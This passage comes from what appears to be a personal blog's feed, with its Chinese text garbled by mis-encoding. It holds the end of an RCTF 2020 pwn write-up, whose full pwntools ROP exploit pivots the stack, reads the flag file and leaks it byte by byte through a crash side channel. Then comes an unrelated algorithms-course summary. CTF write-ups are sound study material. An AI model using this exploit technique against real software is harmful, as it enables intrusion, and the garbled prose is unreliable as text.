ˆç©ºé—´ä¸Šï¼Œå†åˆ©ç”¨gadgetä¿®æ”¹æˆæˆ‘ä»¬æƒ³è¦çš„gadgetå®Œæˆæ•´ä½“çš„åˆ©ç”¨ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ret_csu</span><span class="params">(func,arg1=<span class="number">0</span>,arg2=<span class="number">0</span>,arg3=<span class="number">0</span>)</span>:</span></span><br><span class="line">    payload = <span class="string">''</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(func)</span><br><span class="line">    payload += p64(arg1)+p64(arg2)+p64(arg3)+p64(<span class="number">0x000000000400750</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(host,port=<span class="number">2333</span>)</span>:</span></span><br><span class="line">    <span class="comment"># global p</span></span><br><span class="line">    <span class="comment"># if host:</span></span><br><span class="line">        <span class="comment"># p = remote(host,port)</span></span><br><span class="line">    <span class="comment"># else:</span></span><br><span class="line">        <span class="comment"># p = process("./no_write")</span></span><br><span class="line">        <span class="comment"># gdb.attach(p,"b* 0x0000000004006E6")</span></span><br><span class="line">    <span class="comment"># 0x0000000000400773 : pop rdi ; ret</span></span><br><span class="line">    <span class="comment"># 0x0000000000400771 : pop rsi ; pop r15 ; ret</span></span><br><span class="line">    <span class="comment"># .text:0000000000400544                 call    cs:__libc_start_main_ptr</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># .text:00000000004005E8                 add     [rbp-3Dh], ebx</span></span><br><span class="line">    <span class="comment"># .text:00000000004005EB                 nop     dword ptr [rax+rax+00h]</span></span><br><span class="line">    <span class="comment"># .text:00000000004005F0                 rep retn</span></span><br><span class="line">    charset = <span class="string">'&#125;&#123;_'</span>+string.digits+string.letters</span><br><span class="line">    flag = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x30</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> charset:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># p = remote(host,6000)</span></span><br><span class="line">                p = process(<span class="string">'./no_write'</span>)</span><br><span class="line">                pppppp_ret = <span class="number">0x00000000040076A</span></span><br><span class="line">                read_got = <span class="number">0x000000000600FD8</span></span><br><span class="line">                call_libc_start_main = <span class="number">0x000000000400544</span></span><br><span class="line">                p_rdi = <span class="number">0x0000000000400773</span></span><br><span class="line">                p_rsi_r15 = <span class="number">0x0000000000400771</span></span><br><span class="line">                <span class="comment"># 03:0018|  0x601318 -&gt; 0x7f6352629d80 (initial) &lt;-0x0</span></span><br><span class="line">                offset = <span class="number">0x267870</span> <span class="comment">#initial - __strncmp_sse42</span></span><br><span class="line">                readn = <span class="number">0x0000000004006BF</span></span><br><span class="line">                leave_tet = <span class="number">0x00000000040070B</span></span><br><span class="line">                payload = <span class="string">"A"</span>*<span class="number">0x18</span>+p64(pppppp_ret)+ret_csu(read_got,<span class="number">0</span>,<span class="number">0x601350</span>,<span class="number">0x400</span>)  </span><br><span class="line">                payload += p64(<span class="number">0</span>)+p64(<span class="number">0x6013f8</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(leave_tet)  <span class="comment"># move stack to 0x601400</span></span><br><span class="line">                payload = payload.ljust(<span class="number">0x100</span>,<span class="string">'\x00'</span>)</span><br><span class="line">                p.send(payload)</span><br><span class="line">                sleep(<span class="number">0.3</span>)</span><br><span class="line">                payload = <span class="string">"\x00"</span>*(<span class="number">0x100</span><span class="number">-0x50</span>)  <span class="comment"># 0x601400</span></span><br><span class="line">                payload += p64(p_rdi)+p64(readn)+p64(call_libc_start_main)  <span class="comment"># also has rsi=0x601350 rdx=0x400</span></span><br><span class="line">                payload = payload.ljust(<span class="number">0x400</span>,<span class="string">'\x00'</span>)</span><br><span class="line">                <span class="comment"># pause()</span></span><br><span class="line">                p.send(payload)</span><br><span class="line">                <span class="comment"># pause()</span></span><br><span class="line">                sleep(<span class="number">0.3</span>)</span><br><span class="line">                <span class="comment"># 0x601318</span></span><br><span class="line">                payload = p64(pppppp_ret)+p64((<span class="number">0x100000000</span>-offset)&amp;<span class="number">0xffffffff</span>)  </span><br><span class="line">                payload += p64(<span class="number">0x601318</span>+<span class="number">0x3D</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x4005E8</span>)  <span class="comment"># add [rbp-3Dh], ebx</span></span><br><span class="line">                <span class="comment"># 0x00000000000d2975: syscall; ret;</span></span><br><span class="line">                <span class="comment"># 02:0010|            0x601310 -&gt; 0x7f61d00d8628 (__exit_funcs_lock) &lt;- 0x0</span></span><br><span class="line">                offset = <span class="number">0x31dcb3</span> <span class="comment"># __exit_funcs_lock - syscall</span></span><br><span class="line">                payload += p64(pppppp_ret)+p64((<span class="number">0x100000000</span>-offset)&amp;<span class="number">0xffffffff</span>)</span><br><span class="line">                payload += p64(<span class="number">0x601310</span>+<span class="number">0x3D</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x4005E8</span>)</span><br><span class="line">                payload += p64(pppppp_ret)+ret_csu(read_got,<span class="number">0</span>,<span class="number">0x601800</span>,<span class="number">2</span>)  <span class="comment"># make rax=2</span></span><br><span class="line">                payload += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">                payload += p64(pppppp_ret)+ret_csu(<span class="number">0x601310</span>,<span class="number">0x601350</span>+<span class="number">0x3f8</span>,<span class="number">0</span>,<span class="number">0</span>) <span class="comment">#open flag</span></span><br><span class="line">                payload += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">                payload += p64(pppppp_ret)+ret_csu(read_got,<span class="number">3</span>,<span class="number">0x601800</span>,<span class="number">0x100</span>)   <span class="comment">#read flag</span></span><br><span class="line">                payload += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">                payload += p64(pppppp_ret)+ret_csu(read_got,<span class="number">0</span>,<span class="number">0x601ff8</span>,<span class="number">8</span>)</span><br><span class="line">                <span class="comment"># now we can cmp the flag one_by_one</span></span><br><span class="line">                payload += p64(<span class="number">0</span>)*<span class="number">6</span> </span><br><span class="line">                payload += p64(pppppp_ret)+ret_csu(<span class="number">0x601318</span>,<span class="number">0x601800</span>+i,<span class="number">0x601fff</span>,<span class="number">2</span>)  <span class="comment"># cmp flag</span></span><br><span class="line">                payload += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">                <span class="comment"># for _ in range(4):</span></span><br><span class="line">                <span class="comment">#     payload += p64(p_rdi)+p64(0x601700)+p64(p_rsi_r15)+p64(0x100)+p64(0)+p64(readn)</span></span><br><span class="line">                payload += p64(p_rdi)+p64(<span class="number">0x601700</span>)+p64(p_rsi_r15)+p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)+p64(readn)</span><br><span class="line"></span><br><span class="line">                payload = payload.ljust(<span class="number">0x3f8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">                payload += <span class="string">"flag\x00\x00\x00\x00"</span></span><br><span class="line">                p.send(payload)</span><br><span class="line">                <span class="comment"># pause()</span></span><br><span class="line">                sleep(<span class="number">0.3</span>)</span><br><span class="line">                p.send(<span class="string">"dd"</span>+<span class="string">"d"</span>*<span class="number">7</span>+j)</span><br><span class="line">                <span class="comment"># pause()</span></span><br><span class="line">                sleep(<span class="number">0.5</span>)</span><br><span class="line">                p.recv(timeout=<span class="number">0.5</span>)</span><br><span class="line">                p.send(<span class="string">"A"</span>*<span class="number">0x100</span>)</span><br><span class="line">                <span class="comment"># pause()</span></span><br><span class="line">                <span class="comment"># info(j)</span></span><br><span class="line">                p.close()</span><br><span class="line">                <span class="comment"># p.interactive()</span></span><br><span class="line">            <span class="keyword">except</span> EOFError:</span><br><span class="line">                flag += j</span><br><span class="line">                info(flag)</span><br><span class="line">                print(<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">if</span>(j == <span class="string">'&#125;'</span>):</span><br><span class="line">                    exit()</span><br><span class="line">                p.close()</span><br><span class="line">                <span class="comment"># pause()</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line">    main(args[<span class="string">"REMOTE"</span>])</span><br></pre></td></tr></table></figure><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://blog.rois.io/2020/rctf-2020-official-writeup/" target="_blank" rel="noopener">https://blog.rois.io/2020/rctf-2020-official-writeup/</a></p><p><a href="https://www.jianshu.com/p/be6bbc251919" target="_blank" rel="noopener">https://www.jianshu.com/p/be6bbc251919</a></p><p><a href="https://mp.weixin.qq.com/s/Ov5PXoh-gHYYrOCA9TNWGw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Ov5PXoh-gHYYrOCA9TNWGw</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;åšå®¢é•¿è‰ä¸¥é‡ï¼Œä¸ŠåŠå¹´æ‘¸é±¼å¤ªä¹…ã€‚æœ€è¿‘è¶ç€æœ‰ç©ºå¼€å§‹å¤ç°ä¹‹å‰çš„ä¸€äº›é¢˜ç›®ï¼Œè¿™æ¬¡åšäº†2020RCTFçš„å‡ é“pwné¢˜ï¼Œæœ¬æ¥è¿˜æƒ³ç€æŠŠMIPSé‚£é“é¢˜åšå‡ºæ¥å†å‘ï¼Œç»“æœå‘ç°MIPSçš„è°ƒè¯•è¿˜æœ‰å¾ˆå¤šé—®é¢˜ï¼Œæ‰€ä»¥å°±å…ˆå‘å¸¸è§„ä¸€ç‚¹çš„é¢˜ã€‚&lt;/p&gt;
&lt;h2 id=&quot;note&quot;&gt;&lt;a href=&quot;#note&quot; 
      
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="CTF" scheme="https://hurricane618.me/tags/CTF/"/>
    
      <category term="ROP" scheme="https://hurricane618.me/tags/ROP/"/>
    
      <category term="heap" scheme="https://hurricane618.me/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>ç®—æ³•è¯¾ç¨‹æ€»ç»“</title>
    <link href="https://hurricane618.me/2020/01/13/algorithm-course-summary/"/>
    <id>https://hurricane618.me/2020/01/13/algorithm-course-summary/</id>
    <published>2020-01-13T11:00:36.000Z</published>
    <updated>2020-01-13T11:03:07.533Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸€å¼€å§‹åªæ˜¯æŠ±ç€å¼€é˜”è§†é‡çš„å¿ƒæ€æ¥çš„ï¼Œæƒ³ç€ç®—æ³•æ˜¯ITè¡Œä¸šå“ªé‡Œéƒ½ä¼šç”¨åˆ°çš„ä¸œè¥¿ï¼Œå­¦å®Œä¹‹åè§‰å¾—åœè€å¸ˆä¸æ„§æ˜¯æ•™äº†13å¹´çš„è€å¸ˆï¼Œå¾ˆå¤šåœ°æ–¹éƒ½å¾ˆå—ç›Šï¼Œè™½ç„¶ä¸æ˜¯ä¸“é—¨åšç®—æ³•çš„ï¼Œå…¶ä¸­çš„å¾ˆå¤šæ€æƒ³éƒ½å¯¹ä»¥åçš„å·¥ä½œæœ‰ä¸€å®šå¯å‘ã€‚</p><h2 id="è§‚å¯Ÿé—®é¢˜çš„è§’åº¦"><a href="#è§‚å¯Ÿé—®é¢˜çš„è§’åº¦" class="headerlink" title="è§‚å¯Ÿé—®é¢˜çš„è§’åº¦"></a>è§‚å¯Ÿé—®é¢˜çš„è§’åº¦</h2><h3 id="é—®é¢˜çš„å¯åˆ†è§£æ€§"><a href="#é—®é¢˜çš„å¯åˆ†è§£æ€§" class="headerlink" title="é—®é¢˜çš„å¯åˆ†è§£æ€§"></a>é—®é¢˜çš„å¯åˆ†è§£æ€§</h3><p>æƒ³è¦è§£å†³ä¸€ä¸ªå¤æ‚çš„é—®é¢˜ï¼Œæˆ‘ä»¬é¦–å…ˆä»è¿™ä¸ªé—®é¢˜æœ€ç®€å•çš„å®ä¾‹å…¥æ‰‹ï¼Œè¿™ä¸ªæœ€ç®€å•çš„å®ä¾‹èƒ½ç”¨ä»€ä¹ˆæ–¹æ³•è§£å†³ï¼Ÿå¤æ‚çš„é—®é¢˜èƒ½ä¸èƒ½åˆ†è§£æˆç®€å•çš„é—®é¢˜ï¼Ÿ</p><h3 id="å¯è¡Œæ€§è§£çš„å½¢å¼ä»¥åŠè§£ä¹‹é—´çš„å˜æ¢å…³ç³»"><a href="#å¯è¡Œæ€§è§£çš„å½¢å¼ä»¥åŠè§£ä¹‹é—´çš„å˜æ¢å…³ç³»" class="headerlink" title="å¯è¡Œæ€§è§£çš„å½¢å¼ä»¥åŠè§£ä¹‹é—´çš„å˜æ¢å…³ç³»"></a>å¯è¡Œæ€§è§£çš„å½¢å¼ä»¥åŠè§£ä¹‹é—´çš„å˜æ¢å…³ç³»</h3><p>é—®é¢˜çš„å¯è¡Œè§£çš„å½¢å¼æ˜¯ä»€ä¹ˆï¼Ÿå¯è¡Œè§£çš„æ€»æ•°æœ‰å¤šå°‘ï¼Ÿå¯è¡Œè§£èƒ½å¦ä¸€æ­¥ä¸€æ­¥çš„é€æ­¥æ„å»ºå‡ºæ¥ï¼Ÿæˆ‘ä»¬èƒ½å¦å¯¹ä¸€ä¸ªå¯è¡Œè§£æ–½åŠ å°å¹…åº¦çš„æ‰°åŠ¨ï¼Œå°†å®ƒå˜æˆå¦å¤–ä¸€ä¸ªå¯è¡Œè§£ï¼Ÿ</p><h3 id="ç±»ä¼¼çš„é—®é¢˜"><a href="#ç±»ä¼¼çš„é—®é¢˜" class="headerlink" title="ç±»ä¼¼çš„é—®é¢˜"></a>ç±»ä¼¼çš„é—®é¢˜</h3><p>å’Œç»™å®šçš„é—®é¢˜ç±»ä¼¼çš„é—®é¢˜æœ‰å“ªäº›ï¼Ÿè§£å†³ç±»ä¼¼é—®é¢˜çš„ç®—æ³•èƒ½å¤Ÿç›´æ¥è¿ç”¨äºè§£å†³å½“å‰çš„é—®é¢˜ï¼Ÿå¦‚æœä¸èƒ½ï¼Œé‚£ä¹ˆæ˜¯ä»€ä¹ˆå› ç´ é€ æˆäº†å¦¨ç¢ï¼Ÿèƒ½å¦æƒ³åˆ°æ–¹æ³•æ¶ˆé™¤è¿™äº›å¦¨ç¢çš„å› ç´ ï¼Ÿ</p><h3 id="ç°æœ‰ç®—æ³•çš„ä¸è¶³"><a href="#ç°æœ‰ç®—æ³•çš„ä¸è¶³" class="headerlink" title="ç°æœ‰ç®—æ³•çš„ä¸è¶³"></a>ç°æœ‰ç®—æ³•çš„ä¸è¶³</h3><p>ç°æœ‰çš„ç®—æ³•æœ‰å“ªäº›ä¸è¶³ï¼Ÿæ¯”å¦‚ï¼šæ˜¯å¦å­˜åœ¨å†—ä½™è®¡ç®—ï¼Ÿå¦‚æœå­˜åœ¨çš„è¯ï¼Œèƒ½å¦æƒ³åˆ°åŠæ³•æ¶ˆé™¤å†—ä½™ï¼Ÿ</p><h2 id="è§£å†³é—®é¢˜çš„æ€è·¯"><a href="#è§£å†³é—®é¢˜çš„æ€è·¯" class="headerlink" title="è§£å†³é—®é¢˜çš„æ€è·¯"></a>è§£å†³é—®é¢˜çš„æ€è·¯</h2><h3 id="åŸºäºå¯¹é—®é¢˜ç»“æ„è§‚å¯Ÿçš„ç®—æ³•è®¾è®¡"><a href="#åŸºäºå¯¹é—®é¢˜ç»“æ„è§‚å¯Ÿçš„ç®—æ³•è®¾è®¡" class="headerlink" title="åŸºäºå¯¹é—®é¢˜ç»“æ„è§‚å¯Ÿçš„ç®—æ³•è®¾è®¡"></a>åŸºäºå¯¹é—®é¢˜ç»“æ„è§‚å¯Ÿçš„ç®—æ³•è®¾è®¡</h3><p>åœ¨è§£å†³ä¸€ä¸ªé—®é¢˜çš„æ—¶å€™ï¼Œéœ€è¦åˆ†æè¿™ä¸ªé—®é¢˜æ˜¯æ€ä¹ˆç»„æˆçš„ï¼Œèƒ½å¤Ÿæ€ä¹ˆæŠ½è±¡ã€‚è€Œä¸æ˜¯ç›´æ¥ä¸€ä¸ªä¸€ä¸ªç®—æ³•å»å¥—ï¼Œè¿™ç§ç¡¬å¥—çš„æ–¹æ³•å°±æ˜¯ç¢°è¿æ°”ï¼Œå¦‚æœè¿æ°”å¥½å°±èƒ½ç”¨ï¼Œè¿æ°”ä¸å¥½å°±ä¸è¡Œäº†ã€‚</p><h3 id="ä»æœ€ç®€å•çš„ä¾‹å­åšèµ·"><a href="#ä»æœ€ç®€å•çš„ä¾‹å­åšèµ·" class="headerlink" title="ä»æœ€ç®€å•çš„ä¾‹å­åšèµ·"></a>ä»æœ€ç®€å•çš„ä¾‹å­åšèµ·</h3><p>åšå¤æ‚çš„é—®é¢˜å¾ˆå¤šæ—¶å€™ä¼šå¾ˆæ‡µé€¼ï¼Œè¿™ä¸ªæ—¶å€™å°±éœ€è¦ä»æœ€ç®€å•çš„æƒ…å†µè€ƒè™‘é—®é¢˜æ¯”å¦‚n=2ï¼Œn=3çš„æ—¶å€™ï¼Œè¿™æ ·ä¼šæ›´åŠ å®¹æ˜“ä¸Šæ‰‹ã€‚</p><h3 id="è¯•å›¾æŠŠå¤§é—®é¢˜åˆ†è§£æˆå°é—®é¢˜"><a href="#è¯•å›¾æŠŠå¤§é—®é¢˜åˆ†è§£æˆå°é—®é¢˜" class="headerlink" title="è¯•å›¾æŠŠå¤§é—®é¢˜åˆ†è§£æˆå°é—®é¢˜"></a>è¯•å›¾æŠŠå¤§é—®é¢˜åˆ†è§£æˆå°é—®é¢˜</h3><p>å¦‚æœä»ç®€å•é—®é¢˜çš„è§‚å¯Ÿä¸­ï¼Œå‘ç°é—®é¢˜æ˜¯å¯ä»¥åˆ†è§£çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°è¯•æŠŠå¤§é—®é¢˜åˆ†è§£æˆå°é—®é¢˜ã€‚</p><h3 id="è¯•å›¾ä»ç²—ç³™å¼€å§‹é€æ­¥æ”¹å–„"><a href="#è¯•å›¾ä»ç²—ç³™å¼€å§‹é€æ­¥æ”¹å–„" class="headerlink" title="è¯•å›¾ä»ç²—ç³™å¼€å§‹é€æ­¥æ”¹å–„"></a>è¯•å›¾ä»ç²—ç³™å¼€å§‹é€æ­¥æ”¹å–„</h3><p>å¦‚æœä»ç®€å•é—®é¢˜çš„è§‚å¯Ÿä¸­ï¼Œå‘ç°é—®é¢˜æ˜¯ä¸èƒ½åˆ†è§£çš„ï¼Œé‚£ä¹ˆå°±ä»æœ€ç¬¨æœ€ç®€é™‹çš„æ–¹æ³•å¼€å§‹é€æ­¥ä¼˜åŒ–ã€‚</p><h3 id="è¯•å›¾æšä¸¾æ‰€æœ‰çš„è§£ï¼Œä½†æ˜¯è¦ç”¨èªæ˜çš„æ–¹æ³•"><a href="#è¯•å›¾æšä¸¾æ‰€æœ‰çš„è§£ï¼Œä½†æ˜¯è¦ç”¨èªæ˜çš„æ–¹æ³•" class="headerlink" title="è¯•å›¾æšä¸¾æ‰€æœ‰çš„è§£ï¼Œä½†æ˜¯è¦ç”¨èªæ˜çš„æ–¹æ³•"></a>è¯•å›¾æšä¸¾æ‰€æœ‰çš„è§£ï¼Œä½†æ˜¯è¦ç”¨èªæ˜çš„æ–¹æ³•</h3><p>å¦‚æœé—®é¢˜çš„è§£æ˜¯ä¸€ç§é›†åˆï¼Œé‚£ä¹ˆå¯ä»¥å°è¯•æšä¸¾æ‰€æœ‰çš„è§£ã€‚åœ¨éå†çš„è¿‡ç¨‹ä¸­è¦å­¦ä¼šå‰ªæï¼Œä¸è¦æš´åŠ›æ£€ç´¢ã€‚</p><h3 id="éš¾ä»¥ä¼˜åŒ–çš„å‡½æ•°ä½¿ç”¨ä¸‹ç•Œæˆ–è€…ä¸Šç•Œå‡½æ•°ä»£æ›¿"><a href="#éš¾ä»¥ä¼˜åŒ–çš„å‡½æ•°ä½¿ç”¨ä¸‹ç•Œæˆ–è€…ä¸Šç•Œå‡½æ•°ä»£æ›¿" class="headerlink" title="éš¾ä»¥ä¼˜åŒ–çš„å‡½æ•°ä½¿ç”¨ä¸‹ç•Œæˆ–è€…ä¸Šç•Œå‡½æ•°ä»£æ›¿"></a>éš¾ä»¥ä¼˜åŒ–çš„å‡½æ•°ä½¿ç”¨ä¸‹ç•Œæˆ–è€…ä¸Šç•Œå‡½æ•°ä»£æ›¿</h3><p>ä¾‹å¦‚ï¼šEMï¼ŒLagrangianï¼Œlog barrier<br>$$<br>\large \begin{matrix}<br>min &amp; f(x)\<br>s.t. &amp; h(x) \geq 0<br>\end{matrix}<br>$$<br>$f(x)$éš¾ä»¥è®¡ç®—çš„æ—¶å€™ï¼Œä½¿ç”¨æ‹‰æ ¼æœ—æ—¥ä¹˜å­ï¼Œ$L(x,\lambda)=f(x)-\lambda h(x)$ï¼Œå¦‚æœ$\lambda \geq 0$é‚£ä¹ˆå¿…æœ‰$f(x) \geq L(x,\lambda)$ã€‚</p><h3 id="å¤æ‚æ“ä½œçš„æ½œåŠ›ä¸€å®šè¦æŒ–æ˜å¹²å‡€"><a href="#å¤æ‚æ“ä½œçš„æ½œåŠ›ä¸€å®šè¦æŒ–æ˜å¹²å‡€" class="headerlink" title="å¤æ‚æ“ä½œçš„æ½œåŠ›ä¸€å®šè¦æŒ–æ˜å¹²å‡€"></a>å¤æ‚æ“ä½œçš„æ½œåŠ›ä¸€å®šè¦æŒ–æ˜å¹²å‡€</h3><p>ä¾‹å¦‚ï¼šDinicâ€™s algorithm</p><p>ä¸€æ¬¡BFSéœ€è¦O(m)çš„æ—¶é—´ï¼Œåªç”¨äºå¢å¹¿ä¸€æ¡<code>s-&gt;t</code>è·¯ã€‚è€ŒæŠŠä¸€æ¡è·¯æ”¹æˆæ‰€æœ‰è·¯å°±èƒ½æœ€å¤§ç¨‹åº¦çš„å¢åŠ æ•ˆç‡ã€‚ï¼ˆè¿™ä¸ªç®—æ³•å…¶å®æˆ‘æ²¡å¬æ‡‚23333ï¼‰</p><h3 id="æ±‚åŒæ—¶æ»¡è¶³å¤šä¸ªæ¡ä»¶çš„è§£ï¼Œåˆ†æ­¥æ»¡è¶³ï¼Œå¹¶åˆ©ç”¨å¯¹ç§°æ€§"><a href="#æ±‚åŒæ—¶æ»¡è¶³å¤šä¸ªæ¡ä»¶çš„è§£ï¼Œåˆ†æ­¥æ»¡è¶³ï¼Œå¹¶åˆ©ç”¨å¯¹ç§°æ€§" class="headerlink" title="æ±‚åŒæ—¶æ»¡è¶³å¤šä¸ªæ¡ä»¶çš„è§£ï¼Œåˆ†æ­¥æ»¡è¶³ï¼Œå¹¶åˆ©ç”¨å¯¹ç§°æ€§"></a>æ±‚åŒæ—¶æ»¡è¶³å¤šä¸ªæ¡ä»¶çš„è§£ï¼Œåˆ†æ­¥æ»¡è¶³ï¼Œå¹¶åˆ©ç”¨å¯¹ç§°æ€§</h3><p>åœ¨æˆ‘ä»¬è§£å†³LPé—®é¢˜çš„æ—¶å€™ï¼Œé€šå¸¸éœ€è¦æ»¡è¶³å¤šä¸ªæ¡ä»¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è¿™æ ·æ¥è§£å†³é—®é¢˜ï¼Œå…ˆæ»¡è¶³å…¶ä¸­çš„å¤§éƒ¨åˆ†æ¡ä»¶ï¼Œç„¶åå†å¾ªç¯é€¼è¿‘å¦å¤–çš„æ¡ä»¶ï¼Œæˆ–è€…é™ä½ä¸æ»¡è¶³å…¶ä»–æ¡ä»¶çš„ç¨‹åº¦ã€‚</p><h3 id="æƒ³æƒ³å¯¹å¶"><a href="#æƒ³æƒ³å¯¹å¶" class="headerlink" title="æƒ³æƒ³å¯¹å¶"></a>æƒ³æƒ³å¯¹å¶</h3><p>ä¾æ—§æ˜¯åœ¨è§£å†³LPé—®é¢˜æ—¶å€™çš„ä¸€ç§ç­–ç•¥ï¼Œå¦‚æœå•çº¯çš„æ›¿æ¢å˜é‡ä¸å¥½åšï¼Œé‚£ä¹ˆå¯ä»¥è¯•è¯•å¯¹å¶æ¥è§£å†³é—®é¢˜ã€‚</p><h3 id="Random-sampling"><a href="#Random-sampling" class="headerlink" title="Random sampling"></a>Random sampling</h3><p>åˆ†æ²»æ€æƒ³ä¸­çš„å¿«æ’ï¼Œåœ¨é€‰å–åˆ‡åˆ†ç‚¹çš„æ—¶å€™ä¸ä¼šå»é€‰æ‹©æœ€ä¼˜çš„pivotè€Œæ˜¯éšæœºé€‰æ‹©ä¸€ä¸ªã€‚</p><h3 id="Scaling-number"><a href="#Scaling-number" class="headerlink" title="Scaling number"></a>Scaling number</h3><p>åœ¨æœ‰å¾ˆå¤šæ•°å­—è®¡ç®—çš„é—®é¢˜ä¸­ï¼Œå¯ä»¥é‡‡ç”¨æ”¾ç¼©çš„æ–¹æ³•é™ä½è®¡ç®—é‡ã€‚æ¯”å¦‚æ‰€æœ‰çš„æ•°å­—éƒ½é™¤ä¸€ä¸ªæ•°ï¼Œå¦‚æœæ•°å­—å°äº1å°±å˜æˆ0ã€‚</p><h3 id="ä»æœ€å¥½-gt-è¶³å¤Ÿå¥½"><a href="#ä»æœ€å¥½-gt-è¶³å¤Ÿå¥½" class="headerlink" title="ä»æœ€å¥½ =&gt; è¶³å¤Ÿå¥½"></a>ä»æœ€å¥½ =&gt; è¶³å¤Ÿå¥½</h3><p>è¿™ä¸ªæ€æƒ³å’Œrandom samplingæœ‰ç‚¹ç±»ä¼¼ï¼Œä¸ä¸€å®šè¦æœ€å¥½çš„åˆ†æ”¯ç‚¹ï¼ˆå‘½ä¸­æ¦‚ç‡$\frac{1}{n}$ï¼‰ï¼Œåªè¦è¶³å¤Ÿå¥½å°±è¡Œï¼ˆå‘½ä¸­æ¦‚ç‡$\frac{1}{2}$ï¼‰ï¼Œå¦‚æœè¦å¯¹å¿«æ’å†æ¬¡æ”¹è¿›ï¼Œå°±å¯ä»¥è®©é€‰æ‹©pivotçš„æ—¶å€™é™åˆ¶åœ¨ä¸€ä¸ªè¾ƒå¥½çš„åŒºé—´ä¸­ï¼Œé¿å…pivotåœ¨æœ€è¾¹ä¸Šçš„æƒ…å†µã€‚</p><h2 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h2><p>æ¨èäº†ä¸¤æœ¬ä¹¦Polyaçš„ã€Šæ€æ 